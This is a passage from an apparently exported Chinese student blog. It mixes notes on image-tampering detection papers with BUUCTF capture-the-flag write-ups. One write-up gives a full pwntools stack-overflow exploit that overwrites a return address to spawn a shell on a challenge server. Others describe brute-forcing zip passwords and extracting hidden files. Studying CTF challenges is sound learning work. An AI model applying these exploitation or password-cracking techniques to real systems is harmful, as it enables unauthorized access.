      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20A%20Deep%20Learning%20based%20Method%20for%20Image%20Splicing%20Detection/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20A%20Deep%20Learning%20based%20Method%20for%20Image%20Splicing%20Detection/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  A Deep Learning based Method for Image Splicing Detection</p><h1 id="A-Deep-Learning-based-Method-for-Image-Splicing-Detection"><a href="#A-Deep-Learning-based-Method-for-Image-Splicing-Detection" class="headerlink" title="A Deep Learning based Method for Image Splicing Detection"></a>A Deep Learning based Method for Image Splicing Detection</h1><blockquote></blockquote><p>Journal of Physics: Conference Series 1714 (2021) 012038 IOP<br> Publishing doi:10.1088&#x2F;1742-6596&#x2F;1714&#x2F;1&#x2F;012038</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d0314e49d3134ee7a7037c681c3f0005.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/669d2f1a428448eaaae60d7128609c8a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> Res50 进行特征的提取，保留得出的每一个结果。<br> 使用SVM对于test进行分类.</p><p>输出的是图像是否经过篡改的二分类问题，不是像素级别的定位。</p><blockquote></blockquote><p>要是对图像总体进行二分类，那么acc单独作为指标也说得通。 要是对像素进行分类，还只给了acc,那就很过分了。</p><p>本文是对图像总体进行分类。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/e92d7d46ea7c475eba891a84836a8a5b.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f6eb4b6096b74d8e83f53b3d01fb4c65.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>对比的方法不是很新，不过近年来也没有什么对图像进行是否篡改的二分类的文章，毕竟这个二分类没什么用。</p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-rip 尝试PWN入门</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20BUUCTF-rip%20%E5%B0%9D%E8%AF%95PWN%E5%85%A5%E9%97%A8/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20BUUCTF-rip%20%E5%B0%9D%E8%AF%95PWN%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  BUUCTF-rip 尝试PWN入门</p><h1 id="BUUCTF-rip-尝试PWN入门"><a href="#BUUCTF-rip-尝试PWN入门" class="headerlink" title="BUUCTF-rip 尝试PWN入门"></a>BUUCTF-rip 尝试PWN入门</h1><p>BUUCTF-rip</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210503231918973.png"><br> 拿到的是一个什么呢，感觉是一个小系统？<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210503231900595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 但是也就是一个小程序嘛。<br> 这个程序就是执行一个输入输出 的命令。但是这里面存在漏洞。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210503232302522.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210503233225845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70">这个s是15byte的字符<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210503233345569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210503233541335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210503234954224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>在fun部分有一个&#x2F;bin&#x2F;sh<br> 这个据说是一个系统级函数，为什么说是系统级函数呢，因为有一个system吧。</p><p>一般会是什么用都没有。<br> 但是在使用这样的一个payload后,就可以利用，也不知道这个pwn 库是做了什么。感觉像是变魔术。要刚好把堆栈覆盖到这个系统函数的位置？是不是这个解释呢。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#python3 需要预先安装pwntools</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;node3.buuoj.cn&#x27;, &#x27;27532&#x27;) </span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * (0xf + 8) + p64(0x40118A) #这个b是转换为字节流，python3特色 </span><br><span class="line">#这个15+8 好像很神奇的样子，有点玄虚在里面</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()      </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>get函数最后必有一个retn 返回调用地址。堆栈平衡什么的。<br> 0x40118A就是劫持的一个目标函数地址。<br> 使得get 返回了0x40118A，而不是main 中调用get 后的地址。<br> retn相当于pop + 执行，故形成了返回地址劫持。</p><p>效果可能是<br> pop 堆栈 ebp,esp 这里记不清了，应该是这两个寄存器中的一个<br> 0x40118A<br> 等价为<br> pop 堆栈<br> call system(“&#x2F;bin&#x2F;sh”)</p><h2 id="这个就是15-8的来历"><a href="#这个就是15-8的来历" class="headerlink" title="这个就是15+8的来历"></a>这个就是15+8的来历</h2><p>15是s的长度<br> 8是因为64位的系统<br> <strong><strong>我们这边要造成溢出利用，就得要从变量那边写数据，溢出到返回地址，这需要输入的字符串的长度&#x3D;变量大小+ebp<br> 32位程序的ebp的大小是4，64位程序的ebp的大小是8，那么这一题就是23，输入其他的数字一律不灵</strong></strong></p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210504000932128.png">使用checksec命令查看文件的信息。发现是64位。64位就是8byte</p><h1 id="基本函数解释"><a href="#基本函数解释" class="headerlink" title="基本函数解释"></a>基本函数解释</h1><blockquote></blockquote><p><strong>send(data): 发送数据</strong><br><strong>sendline(data) : 发送一行数据，相当于在末尾加\n</strong><br>recv(numb&#x3D;4096, timeout&#x3D;default) : 给出接收字节数,timeout指定超时<br>recvuntil(delims, drop&#x3D;False) : 接收到delims的pattern （以下可以看作until的特例）<br>recvline(keepends&#x3D;True) : 接收到\n，keepends指定保留\n<br>recvall() : 接收到EOF<br>recvrepeat(timeout&#x3D;default) : 接收到EOF或timeout<br>interactive() : 与shell交互<br>连接：本地process()、远程remote( , )；对于remote函数可以接url并且指定端口<br>数据处理：主要是对整数进行打包：<strong>p32、p64是打包为二进制，u32、u64是解包为二进制</strong><br>IO模块：这个比较容易跟zio搞混，记住zio是read、write，pwn是recv、send<br><a href="https://www.jianshu.com/p/6e528b33e37a">作者：SueLyon 链接：https://www.jianshu.com/p/6e528b33e37a<br> 来源：简书</a></p><blockquote></blockquote><p>【1】Canary:Canary保护机制的原理，是在一个函数入口处从fs段内获取一个随机值，一般存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置。如果攻击者利用栈溢出修改到了这个值，导致该值与存入的值不一致，__stack_chk_fail函数将抛出异常并退出程序。Canary最高字节一般是\x00，防止由于其他漏洞产生的Canary泄露<br> 【2】FORTIFY：FORTIFY_SOURCE机制对格式化字符串有两个限制(1)包含%n的格式化字符串不能位于程序内存中的可写地址。(2)当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。<br> 【3】NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过<br> 【4】PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE<br> (0x400000)，括号内的数据就是程序的基地址<br> 【5】RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表</p><p>等我看明白再写的什么</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 二维码 1</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20BUUCTF%20%E4%BA%8C%E7%BB%B4%E7%A0%81%201/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20BUUCTF%20%E4%BA%8C%E7%BB%B4%E7%A0%81%201/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  BUUCTF 二维码 1</p><h1 id="BUUCTF-二维码-1"><a href="#BUUCTF-二维码-1" class="headerlink" title="BUUCTF 二维码 1"></a>BUUCTF 二维码 1</h1><p><img alt="下载文件" src="https://img-blog.csdnimg.cn/20210320002222937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 得到了一个QR-code。</p><p><img alt="在线解码" src="https://img-blog.csdnimg.cn/20210320002309128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 二维码中 的信息是”secret is here”.</p><p>使用常用的解密工具，发现，在binwalk下可以得到有用信息。里面藏了一个压缩包。<br> <img alt="加密压缩包" src="https://img-blog.csdnimg.cn/20210320002500213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 获得了一个加密的压缩包。通过文件名提示，可以猜测，密码是4个数字，那么这个密码的解密难度就很低了。<br> 使用爆破工具进行爆破，这里使用的是AZPR,不用5秒钟，可以得到解密文件，</p><blockquote></blockquote><p>Total passwords: 7,631 Total time: 4ms<br> Average speed (passwords per second): 1,907,750<br> Password for this file: 7639<br> Password in HEX: 37 36 33 39</p><p>解压后，即可得到flag<br> <strong>CTF{vjpw_wnoei}</strong></p><p>但是，应当转为flag{}格式提交。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A Skip Connection Architecture for Localization of Image Manipulations</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20A%20Skip%20Connection%20Architecture%20for%20Localization%20of%20Image%20Manipulations/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20A%20Skip%20Connection%20Architecture%20for%20Localization%20of%20Image%20Manipulations/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  A Skip Connection Architecture for Localization of Image Manipulations</p><h1 id="A-Skip-Connection-Architecture-for-Localization-of-Image-Manipulations"><a href="#A-Skip-Connection-Architecture-for-Localization-of-Image-Manipulations" class="headerlink" title="A Skip Connection Architecture for Localization of Image Manipulations"></a>A Skip Connection Architecture for Localization of Image Manipulations</h1><h1 id="A-Skip-Connection-Architecture-for-Localization-of-Image-Manipulations-1"><a href="#A-Skip-Connection-Architecture-for-Localization-of-Image-Manipulations-1" class="headerlink" title="A Skip Connection Architecture for Localization of Image Manipulations"></a>A Skip Connection Architecture for Localization of Image Manipulations</h1><p><strong>cvpr2019</strong><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/44449aecd8d647ef9593de414044f775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>输入的图像固定为256 * 256 * 3<br> 分为8*8个batch ,每个batch 不重叠，每个batch 为16 * 16 的分辨率<br> 下方的信息流为LSTM 部分，输入为batch。上方信息流直接进行卷积运算，输入为完整的图像 256 * 256 。</p><h2 id="跳跃连接"><a href="#跳跃连接" class="headerlink" title="跳跃连接"></a>跳跃连接</h2><p>三种不同的跳跃连接，通过实验挑选对于此问题最优的跳跃连接<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/baac123ee97c4dafad9d2b0a48bf1444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6e7da3e507984944a5cbf35ec69fc42e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 这是使用无论图中的那个skip比较好的意思。</p><h2 id="LSTM"><a href="#LSTM" class="headerlink" title="LSTM"></a>LSTM</h2><p>图像输入LSTM 。<br> 先对图像进行二维转一维的转换，依据希尔伯特曲线。<br> 依据分形理论，希尔伯特曲线可以历遍整个图像。<br> 图像分为64个batch ，batch 按照希尔伯特曲线排列，输入2 层LSTM网络。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d1459b9cebee42a199efb173e62a1303.png"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ec040fa0910644a3b548cdd6692ce166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h2 id="希尔伯特曲线"><a href="#希尔伯特曲线" class="headerlink" title="希尔伯特曲线"></a><a href="https://www.zhihu.com/question/47954234">希尔伯特曲线</a></h2><p>希尔伯特曲线 的顺序 可以使LSTM得网络有效利用空间局部性。<br> 希尔伯特曲线 可以将二维图像转为1维。 由于是分形图形，所以无论放大多少倍，块之间的相对关系都是不变的。</p><blockquote></blockquote><p>似乎是所谓的“直线有面积吗”的问题 这样看起来是有面积的<br> 还有个叫做分形维度的东西</p><p>此处3阶希尔伯特曲线大小刚刚好是8*8。大块和小块之间的相对位置关系是不变的。</p><h2 id="Train"><a href="#Train" class="headerlink" title="Train"></a>Train</h2><h3 id="datasets"><a href="#datasets" class="headerlink" title="datasets"></a>datasets</h3><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f596d881561f412bb7b6e4f685c5a045.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/29b2fa9a9359410382de889f2a693527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2fadf12f7c0b473da686df43d3a3d12d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_FLAG_MISC</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20BUUCTF_FLAG_MISC/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20BUUCTF_FLAG_MISC/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  BUUCTF_FLAG_MISC</p><h1 id="BUUCTF-FLAG-MISC"><a href="#BUUCTF-FLAG-MISC" class="headerlink" title="BUUCTF_FLAG_MISC"></a>BUUCTF_FLAG_MISC</h1><p>获得的图片《教练，我想打CTF》<s>,感觉是刻在了DNA里面的场景。</s><br> <img alt="教练，我想打ctf" src="https://img-blog.csdnimg.cn/20210323212109424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 先来三板斧，binwalk，stegsolve,winhex来一遍</p><p>发现了stegsolve 中的LSB隐写有问题，出现了PK文件头的字样</p><p><img alt="PK" src="https://img-blog.csdnimg.cn/20210323212310190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 一时间想不起来PK是哪个文件头了。<br> 先保存，保存为bin。</p><p>现在我们知道他是zip格式的文件头了。<br> 给他一个后缀.zip格式</p><p><img alt="zip" src="https://img-blog.csdnimg.cn/20210323212444127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 里面还是有一个不知名的文件。</p><p>怎么都做不下去了，就丢到winhex里面看</p><p>查找题目中的<strong>关键字hctf</strong></p><p><img alt="hctf" src="https://img-blog.csdnimg.cn/20210323212818889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 很神奇就出现了hctf。就是flag。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021032321274716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>当然还看到有人把压缩包丢到linux里面用strings 函数找字符串。<br> 用到的是strings 和grep的通道。<s>（要是有闲心，当然可以人工找）</s><br> 就是有一点要注意，就是要把里面的1文件解压出来，否则它的编码是编码过的，就找不到了。<br> <img alt="linux_strings" src="https://img-blog.csdnimg.cn/20210323213031969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p><strong><strong>2021&#x2F;3&#x2F;23</strong></strong></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CAT-Net- Compression Artifact Tracing Network for Detection and Localization of Image Splicing</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20CAT-Net-%20Compression%20Artifact%20Tracing%20Network%20for%20Detection%20and%20Localization%20of%20Image%20Splicing/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20CAT-Net-%20Compression%20Artifact%20Tracing%20Network%20for%20Detection%20and%20Localization%20of%20Image%20Splicing/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  CAT-Net: Compression Artifact Tracing Network for Detection and Localization of Image Splicing</p><h1 id="CAT-Net-Compression-Artifact-Tracing-Network-for-Detection-and-Localization-of-Image-Splicing"><a href="#CAT-Net-Compression-Artifact-Tracing-Network-for-Detection-and-Localization-of-Image-Splicing" class="headerlink" title="CAT-Net: Compression Artifact Tracing Network for Detection and Localization of Image Splicing"></a>CAT-Net: Compression Artifact Tracing Network for Detection and Localization of Image Splicing</h1><p><strong>图像篡改检测的定位分为三类</strong>： 基于块的检测 ，补丁检测，和像素级的检测</p><p><strong>视觉线索和压缩伪影</strong>：可以作为两个依据来判定图像的篡改</p><p><strong>视觉线索</strong>即像素之间的关系。对于单纯把视觉线索作为网络检测标准的网络，把复制粘贴到纯色背景的情况是绝对检测不出来的。在表格篡改和标语篡改中，这种情况还是很常见的。</p><p>而<strong>压缩伪影</strong>：特指Jpg压缩所用的DCT矩阵，一般还是识别jpg双压缩线索比较常见。ELA之类的。</p><p><strong>池化</strong>：研究表明不适合图像的篡改检测，强化图像的内容，抑制噪声信号。池化可能在cv的其他领域的效果不错，但是在图像篡改检测邻域，会破坏图像像素之间的细微线索，导致检测的失败。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4b2124e309164849afcec91c1cb85384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 这个网络结构好像最近很流行，这种<strong>多分辨率融合</strong>网络，2021年的论文已经连续看到2篇了。</p><p>这个结构的网络说起来真的挺有道理的，多个尺度的特征进行融合，多个分辨率，使用低维特征什么的。</p><p>总之就是从像素的线索和 压缩伪影的线索分别输入到两个流中，最后输入到一个特征融合器里面进行特征的融合。</p><h2 id="不同的尺度之间融合详细"><a href="#不同的尺度之间融合详细" class="headerlink" title="不同的尺度之间融合详细"></a>不同的尺度之间融合详细</h2><p>下采样 用的 不是池化，而是步长为2 的3*3卷积。</p><p>把不同尺度的特征变换大小之后相加。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/bb375cf1670d4927a90625f701ce9c45.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h2 id="噪声伪影流"><a href="#噪声伪影流" class="headerlink" title="噪声伪影流"></a>噪声伪影流</h2><p>这一块没怎么看明白。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/12510fe627a447288d79dd03c8e20e4e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>这个是上图quantization table 线路中所有卷积的描述，大体上是一个残差模块。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/649435622c834b509efa7eea1f4cba45.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h3 id="convert-to-binary-volume"><a href="#convert-to-binary-volume" class="headerlink" title="convert to binary volume"></a>convert to binary volume</h3><p>将DCT矩阵转化为二进制卷？<br> <strong>二进制卷</strong>可能意思就是二进制的一个矩阵吧。把H<em>W大小变为了（T+1）<strong>H</strong>W大小的二进制矩阵。<br> <strong>T</strong> T为区间的范围，类似进行归一化，将所有的元素标准化到[-T,T]之间。<br> 把绝对值不同的分到（T+1）个矩阵通道中去。是*<em>0 到 T</em></em> ，总数T+1个通道。</p><p>作者认为T应当为20最优。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/768005c7e53847a38e36833f89ea7d7c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h3 id="输入不是jpg图片情况"><a href="#输入不是jpg图片情况" class="headerlink" title="输入不是jpg图片情况"></a>输入不是jpg图片情况</h3><p>只有jpg图像有dct矩阵，和量化表。<br> 若是只能检测jpg图片，那么算法的应用性能也是不错了，毕竟jpg压缩效率高，缓解了人类对于流量需求，占据网络流传图片的总数也多。<s>让人想起了中国移动。</s></p><p>当输入为其他格式图像时，人为的计算出DCT矩阵。根据像素值计算？<br> 可以做一个任意格式图片-》jpg的jpg编码器。将所有的量化矩阵设置为同一个，压缩系数设置为100。由此可以实现网络对于任意图片的可输入性。</p><blockquote></blockquote><p><a href="https://blog.csdn.net/newchenxf/article/details/51719597">DCT计算</a> <a href="https://blog.csdn.net/newchenxf/article/details/51719597">https://blog.csdn.net/newchenxf/article/details/51719597</a></p><h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p>一般来说，篡改检测论文的结果展示都是放原图，gt，对比图。输出图像也是黑白的。</p><p>但是这样把结果图预测的TP,TN,FP,FN 用醒目颜色标出的还是头一次看到。这个可以解决结果展示 的颜色单调问题。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d311ee0d41604c19913d1e961d8cff7f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0bdae74f7b2f4277b852b7dfd0e41a11.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_zip 1   压缩包的研究_CRC32爆破</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20BUUCTF_zip%201%20%20%20%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E7%A0%94%E7%A9%B6_CRC32%E7%88%86%E7%A0%B4/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20BUUCTF_zip%201%20%20%20%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E7%A0%94%E7%A9%B6_CRC32%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  BUUCTF_zip 1   压缩包的研究_CRC32爆破</p><h1 id="BUUCTF-zip-1-压缩包的研究-CRC32爆破"><a href="#BUUCTF-zip-1-压缩包的研究-CRC32爆破" class="headerlink" title="BUUCTF_zip 1   压缩包的研究_CRC32爆破"></a>BUUCTF_zip 1   压缩包的研究_CRC32爆破</h1><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210405002317282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 拿到一堆的加密的压缩包，也不是伪加密，也不能爆破。我反正是爆破了所有8位的字母加数字密码。<s>（要是弄一个中文进去，神仙也爆破不了）</s><br> 但是每一个的大小倒是很小。<br> <img alt="在这里插入图片描述" 